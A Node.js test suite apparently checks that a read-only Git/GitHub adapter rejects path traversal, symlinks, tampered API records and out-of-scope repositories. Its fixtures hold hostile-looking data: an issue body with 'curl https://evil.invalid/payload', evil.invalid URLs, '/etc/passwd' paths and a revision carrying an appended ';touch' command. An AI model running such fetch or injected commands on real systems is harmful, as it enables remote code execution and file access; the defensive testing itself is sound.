import assert from 'node:assert/strict';
import { execFile as execFileCallback } from 'node:child_process';
import { chmod, copyFile, mkdir, mkdtemp, readFile, rm, symlink, writeFile } from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { promisify } from 'node:util';
import { test } from 'node:test';

import { createReadAdapter } from '../src/read-adapter.js';
import { git, makeGitFixture } from './fixtures/adoption/helpers.js';

const repositoryRoot = path.resolve(new URL('..', import.meta.url).pathname);
const fakeGhSource = path.join(repositoryRoot, 'test/fixtures/read-adapter/fake-gh.mjs');
const gitShimSource = path.join(repositoryRoot, 'test/fixtures/read-adapter/git-shim.mjs');
const nodeBin = path.dirname(process.execPath);
const execFile = promisify(execFileCallback);

async function expectError(operation, code, reason) {
  let captured;
  await assert.rejects(operation, (error) => {
    captured = error;
    assert.equal(error?.code, code);
    if (reason !== undefined) assert.equal(error?.details?.reason, reason);
    return true;
  });
  return captured;
}

async function withEnvironment(changes, operation) {
  const previous = {};
  for (const key of Object.keys(changes)) {
    previous[key] = process.env[key];
    if (changes[key] === undefined) delete process.env[key];
    else process.env[key] = changes[key];
  }
  try {
    return await operation();
  } finally {
    for (const [key, value] of Object.entries(previous)) {
      if (value === undefined) delete process.env[key];
      else process.env[key] = value;
    }
  }
}

async function readCommandLog(file) {
  try {
    return (await readFile(file, 'utf8')).trim().split('\n').filter(Boolean).map((line) => JSON.parse(line));
  } catch (error) {
    if (error.code === 'ENOENT') return [];
    throw error;
  }
}

async function makeGhFixture(t, scenario = {}) {
  const root = await mkdtemp(path.join(os.tmpdir(), 'assuredloop-read-gh-'));
  const bin = path.join(root, 'bin');
  const scenarioPath = path.join(root, 'scenario.json');
  const log = path.join(root, 'commands.log');
  await mkdir(bin, { recursive: true });
  await writeFile(scenarioPath, `${JSON.stringify(scenario)}\n`);
  const executable = path.join(bin, 'gh');
  await copyFile(fakeGhSource, executable);
  await chmod(executable, 0o755);
  t.after(() => rm(root, { recursive: true, force: true }));
  return {
    bin,
    log,
    env: {
      PATH: `${bin}:${nodeBin}:/usr/bin:/bin`,
      FAKE_GH_SCENARIO: scenarioPath,
      FAKE_GH_LOG: log,
    },
  };
}

async function makeGitShim(t) {
  const root = await mkdtemp(path.join(os.tmpdir(), 'assuredloop-read-git-shim-'));
  const bin = path.join(root, 'bin');
  const executable = path.join(bin, 'git');
  const log = path.join(root, 'git-commands.log');
  await mkdir(bin, { recursive: true });
  await copyFile(gitShimSource, executable);
  await chmod(executable, 0o755);
  const realGit = (await execFile('which', ['git'])).stdout.trim();
  t.after(() => rm(root, { recursive: true, force: true }));
  return {
    bin,
    log,
    env: {
      PATH: `${bin}:${nodeBin}:/usr/bin:/bin`,
      REAL_GIT: realGit,
      GIT_SHIM_LOG: log,
      GIT_NO_LAZY_FETCH: undefined,
    },
  };
}

function noGhEnvironment() {
  return { PATH: `${nodeBin}:/usr/bin:/bin`, FAKE_GH_SCENARIO: undefined, FAKE_GH_LOG: undefined };
}

async function currentRevision(root) {
  return (await git(root, ['rev-parse', 'HEAD'])).stdout.trim();
}

async function gitBlobSha(root, revision, file) {
  return (await git(root, ['rev-parse', `${revision}:${file}`])).stdout.trim();
}

async function gitTreeSha(root, revision, file = null) {
  return (await git(root, ['rev-parse', file ? `${revision}:${file}` : `${revision}^{tree}`])).stdout.trim();
}

async function gitStatus(root) {
  return (await git(root, ['status', '--porcelain'])).stdout;
}

async function makeRemoteGitScenario(t, bytes = Buffer.from('remote\r\nπ bytes\n', 'utf8'), repository = 'example/consumer') {
  const source = await makeGitFixture({
    prefix: 'assuredloop-read-remote-source-',
    remote: `https://github.com/${repository}.git`,
    files: {
      'docs/raw.txt': bytes,
      'docs/other.txt': 'other remote file\n',
      'README.md': '# remote source\n',
    },
  });
  t.after(() => rm(source.root, { recursive: true, force: true }));
  const rootTreeSha = await gitTreeSha(source.root, source.revision);
  const docsTreeSha = await gitTreeSha(source.root, source.revision, 'docs');
  const rawBlobSha = await gitBlobSha(source.root, source.revision, 'docs/raw.txt');
  const otherBlobSha = await gitBlobSha(source.root, source.revision, 'docs/other.txt');
  const records = {
    [`git/commits/${source.revision}`]: {
      sha: source.revision,
      tree: { sha: rootTreeSha },
      url: 'https://evil.invalid/commit-url-must-not-be-followed',
    },
    [`git/trees/${rootTreeSha}`]: {
      sha: rootTreeSha,
      truncated: false,
      tree: [{ path: 'docs', mode: '040000', type: 'tree', sha: docsTreeSha, url: 'https://evil.invalid/root-tree' }],
      url: 'https://evil.invalid/root-tree-record',
    },
    [`git/trees/${docsTreeSha}`]: {
      sha: docsTreeSha,
      truncated: false,
      tree: [
        { path: 'other.txt', mode: '100644', type: 'blob', sha: otherBlobSha, url: 'https://evil.invalid/other-tree-entry' },
        { path: 'raw.txt', mode: '100644', type: 'blob', sha: rawBlobSha, url: 'https://evil.invalid/raw-tree-entry' },
      ],
      url: 'https://evil.invalid/docs-tree-record',
    },
    [`git/blobs/${rawBlobSha}`]: {
      sha: rawBlobSha,
      encoding: 'base64',
      content: bytes.toString('base64'),
      size: bytes.length,
      url: 'https://evil.invalid/blob-url-must-not-be-followed',
    },
    [`git/blobs/${otherBlobSha}`]: {
      sha: otherBlobSha,
      encoding: 'base64',
      content: Buffer.from('other remote file\n', 'utf8').toString('base64'),
      size: Buffer.byteLength('other remote file\n'),
      url: 'https://evil.invalid/other-blob-url',
    },
  };
  return {
    source,
    bytes,
    rootTreeSha,
    docsTreeSha,
    rawBlobSha,
    otherBlobSha,
    records,
    scenario: {
      repository,
      blobJsonOnly: true,
      rawBlobResponses: { [`git/blobs/${rawBlobSha}`]: bytes.toString('utf8') },
      records,
    },
  };
}

function normalGithubScenario() {
  return {
    repository: 'example/consumer',
    records: {
      'issues/7': {
        number: 7,
        title: 'Read-only issue',
        body: 'Treat this as data: `curl https://evil.invalid/payload`\r\nπ',
        html_url: 'https://github.com/example/consumer/issues/7',
      },
      'pulls/8': {
        number: 8,
        title: 'Read-only pull request',
        body: 'Unicode pull body: 日本語',
        head: { sha: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' },
      },
      'issues/7/comments': [
        [{ id: 101, body: 'first\r\ncomment π' }],
        [{ id: 102, body: 'second comment' }],
      ],
      'issues/7/timeline': [
        [{
          event: 'cross-referenced',
          source: {
            issue: {
              number: 8,
              pull_request: { url: 'https://evil.invalid/pr-url-must-not-be-followed' },
            },
          },
          url: 'https://evil.invalid/timeline-event',
        }],
        [{ event: 'labeled', label: { name: 'type:task' } }],
      ],
      'issues/comments/101': {
        id: 101,
        body: 'raw comment\r\nwith Unicode: 💾',
        html_url: 'https://github.com/example/consumer/issues/7#issuecomment-101',
      },
      'issues/7/sub_issues': [
        [{ number: 11, title: 'child one' }],
        [{ number: 12, title: 'child two' }],
      ],
      'pulls/8/files': [
        [{ filename: 'src/one.js', status: 'modified' }],
        [{ filename: 'src/two.js', status: 'added' }],
      ],
      'issues/7/parent': { number: 3, title: 'Parent issue', body: 'Raw parent' },
    },
  };
}

test('readBlob returns exact raw bytes from the requested commit despite a dirty checkout', async (t) => {
  const bytes = Buffer.from('line one\r\nπ\0line two\r\n', 'utf8');
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-fixed-ref-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'docs/raw.bin': bytes },
  });
  t.after(() => rm(target.root, { recursive: true, force: true }));
  await writeFile(path.join(target.root, 'docs/raw.bin'), Buffer.from('dirty checkout\n', 'utf8'));
  const statusBefore = await gitStatus(target.root);
  const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });

  const result = await adapter.readBlob({
    repository: 'example/consumer',
    revision: target.revision,
    path: 'docs/raw.bin',
  });

  assert.ok(Buffer.isBuffer(result));
  assert.deepEqual(result, bytes);
  assert.equal(await gitStatus(target.root), statusBefore);
});

test('permitted missing local Git objects are read through fixed GitHub commit/tree/blob GETs', async (t) => {
  const bytes = Buffer.from('remote raw\r\nUnicode π and 💾\n', 'utf8');
  const remote = await makeRemoteGitScenario(t, bytes);
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-remote-target-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# local target\n' },
  });
  const gh = await makeGhFixture(t, remote.scenario);
  const shim = await makeGitShim(t);
  t.after(() => rm(target.root, { recursive: true, force: true }));
  const statusBefore = await gitStatus(target.root);
  const remoteBefore = (await git(target.root, ['remote', 'get-url', 'origin'])).stdout.trim();
  const ref = { repository: 'example/consumer', revision: remote.source.revision, path: 'docs/raw.txt' };
  const env = {
    ...gh.env,
    ...shim.env,
    PATH: `${gh.bin}:${shim.bin}:${nodeBin}:/usr/bin:/bin`,
    GIT_NO_LAZY_FETCH: undefined,
  };

  await withEnvironment(env, async () => {
    const blobAdapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    assert.deepEqual(await blobAdapter.readBlob(ref), bytes);

    const filesAdapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    assert.deepEqual(await filesAdapter.listFiles({ ...ref, path: 'docs' }), [
      { path: 'docs/other.txt', mode: '100644', type: 'blob', sha: remote.otherBlobSha },
      { path: 'docs/raw.txt', mode: '100644', type: 'blob', sha: remote.rawBlobSha },
    ]);

    const beforeLocalOnly = await readCommandLog(gh.log);
    const localOnlyAdapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer', localOnly: true });
    await expectError(() => localOnlyAdapter.readBlob(ref), 'record-unavailable');
    assert.deepEqual(await readCommandLog(gh.log), beforeLocalOnly);
  });

  const commands = await readCommandLog(gh.log);
  const apiCommands = commands.filter((args) => args[0] === 'api');
  const endpoint = (args) => args.find((value) => value.startsWith('repos/'));
  const remoteEndpoints = apiCommands.map(endpoint).filter((value) => value?.includes('/git/'));
  const expectedRead = [
    `repos/example/consumer/git/commits/${remote.source.revision}`,
    `repos/example/consumer/git/trees/${remote.rootTreeSha}`,
    `repos/example/consumer/git/trees/${remote.docsTreeSha}`,
    `repos/example/consumer/git/blobs/${remote.rawBlobSha}`,
  ];
  const expectedList = expectedRead.slice(0, 3);
  assert.deepEqual(remoteEndpoints.slice(0, expectedRead.length), expectedRead);
  assert.deepEqual(remoteEndpoints.slice(expectedRead.length), expectedList);
  for (const args of apiCommands) {
    assert.ok(args.includes('--method'));
    assert.equal(args[args.indexOf('--method') + 1], 'GET');
    assert.ok(args.includes('--hostname'));
    assert.equal(args[args.indexOf('--hostname') + 1], 'github.com');
    assert.equal(args.some((value) => value.includes('evil.invalid') || value.includes('recursive')), false);
  }
  const blobCommand = apiCommands.find((args) => endpoint(args)?.includes('/git/blobs/'));
  assert.ok(blobCommand);
  assert.ok(blobCommand.includes('Accept: application/vnd.github+json'));
  assert.equal(blobCommand.includes('Accept: application/vnd.github.raw+json'), false);

  const gitCommands = (await readFile(shim.log, 'utf8')).trim().split('\n').filter(Boolean).map((line) => JSON.parse(line));
  assert.equal(gitCommands.some(({ args }) => args.some((value) => ['fetch', 'checkout', 'switch', 'pull', 'clone'].includes(value))), false);
  const objectReads = gitCommands.filter(({ args }) => args.includes('cat-file') || args.includes('ls-tree'));
  assert.ok(objectReads.length > 0);
  assert.ok(objectReads.every(({ noLazyFetch }) => noLazyFetch === '1'));
  assert.equal(await gitStatus(target.root), statusBefore);
  assert.equal((await git(target.root, ['remote', 'get-url', 'origin'])).stdout.trim(), remoteBefore);
});

test('an allowed cross-repository remote read works without a local reference checkout', async (t) => {
  const bytes = Buffer.from('foreign raw\r\nUnicode π\n', 'utf8');
  const remote = await makeRemoteGitScenario(t, bytes, 'example/reference');
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-remote-cross-target-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# local target\n' },
  });
  const gh = await makeGhFixture(t, remote.scenario);
  const shim = await makeGitShim(t);
  t.after(() => rm(target.root, { recursive: true, force: true }));
  const statusBefore = await gitStatus(target.root);
  const remoteBefore = (await git(target.root, ['remote', 'get-url', 'origin'])).stdout.trim();
  const ref = { repository: 'example/reference', revision: remote.source.revision, path: 'docs/raw.txt' };

  await withEnvironment({
    ...gh.env,
    ...shim.env,
    PATH: `${gh.bin}:${shim.bin}:${nodeBin}:/usr/bin:/bin`,
    GIT_NO_LAZY_FETCH: undefined,
  }, async () => {
    const adapter = await createReadAdapter({
      targetRoot: target.root,
      repository: 'example/consumer',
      allowedRepositories: ['example/reference'],
    });
    assert.deepEqual(await adapter.readBlob(ref), bytes);
  });

  const apiCommands = (await readCommandLog(gh.log)).filter((args) => args[0] === 'api');
  const endpoints = apiCommands.map((args) => args.find((value) => value.startsWith('repos/')));
  assert.deepEqual(endpoints.filter((value) => value?.includes('/git/')), [
    `repos/example/reference/git/commits/${remote.source.revision}`,
    `repos/example/reference/git/trees/${remote.rootTreeSha}`,
    `repos/example/reference/git/trees/${remote.docsTreeSha}`,
    `repos/example/reference/git/blobs/${remote.rawBlobSha}`,
  ]);
  const blobEndpoint = `repos/example/reference/git/blobs/${remote.rawBlobSha}`;
  const blobCommand = apiCommands.find((args) => args.includes(blobEndpoint));
  assert.ok(blobCommand?.includes('Accept: application/vnd.github+json'));
  const gitCommands = (await readFile(shim.log, 'utf8')).trim().split('\n').filter(Boolean).map((line) => JSON.parse(line));
  assert.equal(gitCommands.some(({ args }) => args.some((value) => ['fetch', 'checkout', 'switch', 'pull', 'clone'].includes(value))), false);
  assert.equal(await gitStatus(target.root), statusBefore);
  assert.equal((await git(target.root, ['remote', 'get-url', 'origin'])).stdout.trim(), remoteBefore);
});

test('remote Git object fallback rejects unsafe, truncated and malformed responses', async (t) => {
  const cases = [
    {
      name: 'linked tree entry',
      path: 'linked.txt',
      expectedCode: 'path-unsafe',
      mutate(remote) {
        remote.records[`git/trees/${remote.rootTreeSha}`].tree = [
          { path: 'linked.txt', mode: '120000', type: 'blob', sha: remote.rawBlobSha, url: 'https://evil.invalid/linked' },
        ];
      },
    },
    {
      name: 'submodule tree entry',
      path: 'module',
      expectedCode: 'path-unsafe',
      mutate(remote) {
        remote.records[`git/trees/${remote.rootTreeSha}`].tree = [
          { path: 'module', mode: '160000', type: 'commit', sha: remote.rawBlobSha, url: 'https://evil.invalid/submodule' },
        ];
      },
    },
    {
      name: 'truncated tree',
      path: 'docs/raw.txt',
      expectedCode: 'record-unavailable',
      mutate(remote) {
        remote.records[`git/trees/${remote.rootTreeSha}`].truncated = true;
      },
    },
    {
      name: 'commit SHA mismatch',
      path: 'docs/raw.txt',
      expectedCode: 'record-unavailable',
      mutate(remote) {
        remote.records[`git/commits/${remote.source.revision}`].sha = '0'.repeat(40);
      },
    },
    {
      name: 'tree SHA mismatch',
      path: 'docs/raw.txt',
      expectedCode: 'record-unavailable',
      mutate(remote) {
        remote.records[`git/trees/${remote.rootTreeSha}`].sha = '0'.repeat(40);
      },
    },
    {
      name: 'tree payload wrong type',
      path: 'docs/raw.txt',
      expectedCode: 'record-unavailable',
      mutate(remote) {
        remote.records[`git/trees/${remote.rootTreeSha}`].tree = { path: 'docs', type: 'tree' };
      },
    },
    {
      name: 'blob SHA mismatch',
      path: 'docs/raw.txt',
      expectedCode: 'record-unavailable',
      mutate(remote) {
        remote.records[`git/blobs/${remote.rawBlobSha}`].sha = '0'.repeat(40);
      },
    },
    {
      name: 'blob content mismatch with same SHA and size',
      path: 'docs/raw.txt',
      expectedCode: 'record-unavailable',
      mutate(remote) {
        const replacement = Buffer.from('remote\r\nΩ bytes\n', 'utf8');
        assert.equal(replacement.length, remote.bytes.length);
        remote.records[`git/blobs/${remote.rawBlobSha}`].content = replacement.toString('base64');
      },
    },
    {
      name: 'unsupported blob encoding',
      path: 'docs/raw.txt',
      expectedCode: 'record-unavailable',
      mutate(remote) {
        remote.records[`git/blobs/${remote.rawBlobSha}`].encoding = 'utf-8';
      },
    },
    {
      name: 'invalid base64 content',
      path: 'docs/raw.txt',
      expectedCode: 'record-unavailable',
      mutate(remote) {
        remote.records[`git/blobs/${remote.rawBlobSha}`].content = '%%%not-base64%%%';
      },
    },
    {
      name: 'invalid JSON response',
      path: 'docs/raw.txt',
      expectedCode: 'record-unavailable',
      mutate(remote) {
        remote.scenario.rawResponses = {
          [`git/blobs/${remote.rawBlobSha}`]: '{not-json\n',
        };
      },
    },
  ];

  for (const current of cases) {
    const remote = await makeRemoteGitScenario(t);
    current.mutate(remote);
    const target = await makeGitFixture({
      prefix: `assuredloop-read-remote-negative-${current.name.replaceAll(' ', '-')}-`,
      remote: 'https://github.com/example/consumer.git',
      files: { 'README.md': '# local target\n' },
    });
    const gh = await makeGhFixture(t, remote.scenario);
    t.after(() => rm(target.root, { recursive: true, force: true }));

    await withEnvironment(gh.env, async () => {
      const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
      await expectError(() => adapter.readBlob({
        repository: 'example/consumer',
        revision: remote.source.revision,
        path: current.path,
      }), current.expectedCode, current.expectedReason);
    });
    const gitEndpoints = (await readCommandLog(gh.log))
      .filter((args) => args[0] === 'api')
      .map((args) => args.find((value) => value.startsWith('repos/')))
      .filter((value) => value?.includes('/git/'));
    assert.ok(gitEndpoints.length > 0, `${current.name} must exercise remote Git API fallback`);
  }
});

test('remote Git object fallback distinguishes inaccessible repositories from unavailable objects', async (t) => {
  const cases = [
    {
      name: 'forbidden repository',
      scenario(remote) { remote.scenario.mode = 'forbidden'; },
      expectedCode: 'tool-unavailable',
      expectedReason: 'insufficient-access',
      expectObjectEndpoints: false,
    },
    {
      name: 'unreachable repository metadata',
      scenario(remote) { remote.scenario.mode = 'access-404'; },
      expectedCode: 'tool-unavailable',
      expectedReason: 'insufficient-access',
      expectObjectEndpoints: false,
    },
    {
      name: 'missing commit object',
      scenario(remote) {
        remote.scenario.missing = [`git/commits/${remote.source.revision}`];
      },
      expectedCode: 'record-unavailable',
      expectObjectEndpoints: true,
    },
  ];

  for (const current of cases) {
    const remote = await makeRemoteGitScenario(t);
    current.scenario(remote);
    const target = await makeGitFixture({
      prefix: `assuredloop-read-remote-availability-${current.name.replaceAll(' ', '-')}-`,
      remote: 'https://github.com/example/consumer.git',
      files: { 'README.md': '# local target\n' },
    });
    const gh = await makeGhFixture(t, remote.scenario);
    t.after(() => rm(target.root, { recursive: true, force: true }));

    await withEnvironment(gh.env, async () => {
      const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
      await expectError(() => adapter.readBlob({
        repository: 'example/consumer',
        revision: remote.source.revision,
        path: 'docs/raw.txt',
      }), current.expectedCode, current.expectedReason);
    });
    const apiEndpoints = (await readCommandLog(gh.log))
      .filter((args) => args[0] === 'api')
      .map((args) => args.find((value) => value.startsWith('repos/')));
    const metadataEndpoints = apiEndpoints.filter((value) => value === 'repos/example/consumer');
    const gitEndpoints = apiEndpoints.filter((value) => value?.includes('/git/'));
    assert.ok(metadataEndpoints.length > 0, `${current.name} must confirm bound repository access`);
    if (current.expectObjectEndpoints) assert.ok(gitEndpoints.length > 0, `${current.name} must exercise remote Git API fallback`);
    else assert.equal(gitEndpoints.length, 0, `${current.name} must stop before object requests after metadata access failure`);
  }
});

test('readBlob ignores an actual Git replace ref and reads the recorded revision bytes', async (t) => {
  const original = Buffer.from('recorded bytes\r\nπ', 'utf8');
  const replacement = Buffer.from('replacement bytes\r\nΩ', 'utf8');
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-replace-ref-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'docs/raw.txt': original },
  });
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await writeFile(path.join(target.root, 'docs/raw.txt'), replacement);
  await git(target.root, ['add', 'docs/raw.txt']);
  await git(target.root, ['commit', '-q', '-m', 'replacement commit']);
  const replacementRevision = await currentRevision(target.root);
  await git(target.root, ['replace', target.revision, replacementRevision]);
  assert.equal((await git(target.root, ['replace', '-l'])).stdout.trim(), target.revision);
  assert.equal((await git(target.root, ['show', `${target.revision}:docs/raw.txt`])).stdout, replacement.toString('utf8'));

  const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
  const result = await adapter.readBlob({
    repository: 'example/consumer',
    revision: target.revision,
    path: 'docs/raw.txt',
  });
  assert.deepEqual(result, original);
});

test('listFiles returns fixed-revision scoped tree entries and ignores dirty checkout files', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-tree-',
    remote: 'https://github.com/example/consumer.git',
    files: {
      'src/one.js': 'export const one = 1;\n',
      'src/sub/two.js': 'export const two = 2;\n',
      'README.md': '# consumer\n',
    },
  });
  t.after(() => rm(target.root, { recursive: true, force: true }));
  await writeFile(path.join(target.root, 'src/one.js'), 'dirty checkout\n');
  await writeFile(path.join(target.root, 'src/three.js'), 'untracked\n');
  const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });

  const entries = await adapter.listFiles({
    repository: 'example/consumer',
    revision: target.revision,
    path: 'src',
  });

  assert.deepEqual(entries, [
    { path: 'src/one.js', mode: '100644', type: 'blob', sha: await gitBlobSha(target.root, target.revision, 'src/one.js') },
    { path: 'src/sub/two.js', mode: '100644', type: 'blob', sha: await gitBlobSha(target.root, target.revision, 'src/sub/two.js') },
  ]);
  await expectError(() => adapter.listFiles({
    repository: 'example/consumer',
    revision: target.revision,
    path: '../src',
  }), 'path-unsafe');
});

test('read adapter requires an absolute target and rejects an origin binding mismatch', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-binding-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# consumer\n' },
  });
  t.after(() => rm(target.root, { recursive: true, force: true }));

  await expectError(
    () => createReadAdapter({ targetRoot: 'relative-target', repository: 'example/consumer' }),
    'binding-invalid',
  );

  await git(target.root, ['remote', 'set-url', 'origin', 'https://github.com/example/other.git']);
  await expectError(
    () => createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' }),
    'binding-invalid',
  );
});

test('readBlob enforces repository allowlists and validates explicit cross-repository bindings', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-scope-target-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# consumer\n' },
  });
  const reference = await makeGitFixture({
    prefix: 'assuredloop-read-scope-reference-',
    remote: 'https://github.com/example/reference.git',
    files: { 'shared/raw.txt': Buffer.from('reference bytes\r\nπ', 'utf8') },
  });
  const mismatched = await makeGitFixture({
    prefix: 'assuredloop-read-scope-mismatch-',
    remote: 'https://github.com/example/not-reference.git',
    files: { 'shared/raw.txt': 'wrong binding\n' },
  });
  t.after(async () => Promise.all([
    rm(target.root, { recursive: true, force: true }),
    rm(reference.root, { recursive: true, force: true }),
    rm(mismatched.root, { recursive: true, force: true }),
  ]));

  const adapter = await createReadAdapter({
    targetRoot: target.root,
    repository: 'example/consumer',
    referenceRoots: { 'example/reference': reference.root },
    allowedRepositories: ['example/reference'],
  });
  const ref = { repository: 'example/reference', revision: reference.revision, path: 'shared/raw.txt' };
  assert.deepEqual(await adapter.readBlob(ref), Buffer.from('reference bytes\r\nπ', 'utf8'));

  await expectError(
    () => adapter.readBlob({ ...ref, repository: 'example/outside' }),
    'reference-out-of-scope',
  );

  const mismatchedAdapter = await createReadAdapter({
    targetRoot: target.root,
    repository: 'example/consumer',
    referenceRoots: { 'example/reference': mismatched.root },
    allowedRepositories: ['example/reference'],
  });
  await expectError(() => mismatchedAdapter.readBlob(ref), 'binding-invalid');
});

test('a mapped foreign reference root is still out of scope when its repository is not allowed', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-unallowed-target-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# consumer\n' },
  });
  const foreign = await makeGitFixture({
    prefix: 'assuredloop-read-unallowed-foreign-',
    remote: 'https://github.com/example/foreign.git',
    files: { 'shared/raw.txt': 'foreign bytes\n' },
  });
  t.after(async () => Promise.all([
    rm(target.root, { recursive: true, force: true }),
    rm(foreign.root, { recursive: true, force: true }),
  ]));

  const adapter = await createReadAdapter({
    targetRoot: target.root,
    repository: 'example/consumer',
    referenceRoots: { 'example/foreign': foreign.root },
  });
  await expectError(() => adapter.readBlob({
    repository: 'example/foreign',
    revision: foreign.revision,
    path: 'shared/raw.txt',
  }), 'reference-out-of-scope');
});

test('readBlob rejects traversal, absolute paths, symlink blobs, missing records and command-shaped revisions', async (t) => {
  const outside = await mkdtemp(path.join(os.tmpdir(), 'assuredloop-read-outside-'));
  const outsideFile = path.join(outside, 'secret.txt');
  await writeFile(outsideFile, 'outside secret\n');
  const outsideDirectory = path.join(outside, 'directory');
  await mkdir(outsideDirectory, { recursive: true });
  await writeFile(path.join(outsideDirectory, 'secret.txt'), 'outside directory secret\n');
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-paths-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'docs/raw.txt': 'inside\n' },
  });
  const linkedPath = path.join(target.root, 'docs', 'linked.txt');
  await symlink(outsideFile, linkedPath);
  await symlink(outsideDirectory, path.join(target.root, 'docs', 'linked-directory'));
  await git(target.root, ['add', 'docs/linked.txt']);
  await git(target.root, ['add', 'docs/linked-directory']);
  await git(target.root, ['commit', '-q', '-m', 'add linked fixture']);
  const linkedRevision = await currentRevision(target.root);
  t.after(async () => Promise.all([
    rm(outside, { recursive: true, force: true }),
    rm(target.root, { recursive: true, force: true }),
  ]));

  const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
  const baseRef = { repository: 'example/consumer', revision: target.revision, path: 'docs/raw.txt' };
  for (const unsafePath of ['../outside.txt', '/etc/passwd', 'docs/../raw.txt', 'docs//raw.txt']) {
    await expectError(() => adapter.readBlob({ ...baseRef, path: unsafePath }), 'path-unsafe');
  }
  await expectError(() => adapter.readBlob({
    repository: 'example/consumer',
    revision: linkedRevision,
    path: 'docs/linked.txt',
  }), 'path-unsafe');
  await expectError(() => adapter.readBlob({
    repository: 'example/consumer',
    revision: linkedRevision,
    path: 'docs/linked-directory/secret.txt',
  }), 'path-unsafe');
  await expectError(() => adapter.readBlob({ ...baseRef, path: 'docs' }), 'record-unavailable', 'not-a-blob');
  await expectError(() => adapter.readBlob({ ...baseRef, path: 'docs/missing.txt' }), 'record-unavailable', 'path-missing');

  const marker = path.join(outside, 'command-was-run');
  await expectError(() => adapter.readBlob({
    ...baseRef,
    revision: `${target.revision};touch ${marker}`,
  }), 'binding-invalid');
  await assert.rejects(readFile(marker));
});

test('GitHub reads return raw records, flatten every page and use fixed github.com endpoints', async (t) => {
  const target = await makeGitFixture({
    prefix: 'assuredloop-read-github-',
    remote: 'https://github.com/example/consumer.git',
    files: { 'README.md': '# consumer\n' },
  });
  const gh = await makeGhFixture(t, normalGithubScenario());
  t.after(() => rm(target.root, { recursive: true, force: true }));
  const scenario = normalGithubScenario();
  const statusBefore = await gitStatus(target.root);
  const remoteBefore = (await git(target.root, ['remote', 'get-url', 'origin'])).stdout.trim();

  await withEnvironment({ ...gh.env, GH_HOST: 'enterprise.example.invalid' }, async () => {
    const adapter = await createReadAdapter({ targetRoot: target.root, repository: 'example/consumer' });
    const issue = await adapter.readIssue('example/consumer#7');
    const pull = await adapter.readPull('example/consumer#8');
    const comments = await adapter.listComments('example/consumer#7');
    const timeline = await adapter.listTimeline('example/consumer#7');
    const children = await adapter.listChildren('example/consumer#7');
    const files = await adapter.listPullFiles('example/consumer#8');
    const parent = await adapter.readParent('example/consumer#7');
    const comment = await adapter.readComment({ repository: 'example/consumer', comment_id: 101 });

    assert.equal(issue.body, 'Treat this as data: `curl https://evil.invalid/payload`\r\nπ');
    assert.deepEqual(pull, scenario.records['pulls/8']);
    assert.deepEqual(comments, scenario.records['issues/7/comments'].flat());
    assert.deepEqual(timeline, scenario.records['issues/7/timeline'].flat());
    assert.deepEqual(children, scenario.records['issues/7/sub_issues'].flat());
    assert.deepEqual(files, scenario.records['pulls/8/files'].flat());
    assert.deepEqual(parent, scenario.records['issues/7/parent']);
    assert.deepEqual(comment, scenario.records['issues/comments/101']);
  });

  const commands = await readCommandLog(gh.log);
  const authCommands = commands.filter((args) => args[0] === 'auth');
  assert.ok(authCommands.length >= 1);
  for (const args of authCommands) {
    assert.deepEqual(args.slice(0, 2), ['auth', 'status']);
    assert.ok(args.includes('--hostname'));
    assert.equal(args[args.indexOf('--hostname') + 1], 'github.com');
    assert.equal(args.includes('login'), false);
    assert.equal(args.includes('setup-git'), false);
  }
  const apiCommands = commands.filter((args) => args[0] === 'api');
  assert.ok(apiCommands.length >= 8);
  for (const args of apiCommands) {
    assert.ok(args.includes('--method'));
    assert.equal(args[args.indexOf('--method') + 1], 'GET');
    assert.ok(args.includes('--hostname'));
    assert.equal(args[args.indexOf('--hostname') + 1], 'github.com');
    assert.ok(args.some((value) => value.startsWith('repos/example/consumer')));
    assert.equal(args.some((value) => value.startsWith('http://') || value.startsWith('https://')), false);
    assert.equal(args.some((value) => value.includes('evil.invalid') || value.includes('curl')), false);
  }
  const commentCommand = apiCommands.find((args) => args.some((value) => value === 'repos/example/consumer/issues/comments/101'));
  assert.ok(commentCommand);
  assert.ok(commentCommand.some((value) => value.includes('application/vnd.github.raw+json')));
  assert.ok(commentCommand.some((value) => value.includes('2022-11-28')));
  const timelineCommand = apiCommands.find((args) => args.some((value) => value === 'repos/example/consumer/issues/7/timeline?per_page=100'));
  assert.ok(timelineCommand);
  assert.ok(timelineCommand.includes('--paginate'));
  assert.ok(timelineCommand.includes('--slurp'));
  assert.ok(timelineCommand.includes('Accept: application/vnd.github.raw+json'));
  assert.ok(timelineCommand.includes('X-GitHub-Api-Version: 2022-11-28'));
  assert.equal(await gitStatus(target.root), statusBefore);
  assert.equal((await git(target.root, ['remote', 'get-url', 'origin'])).stdout.trim(), remoteBefore);
});

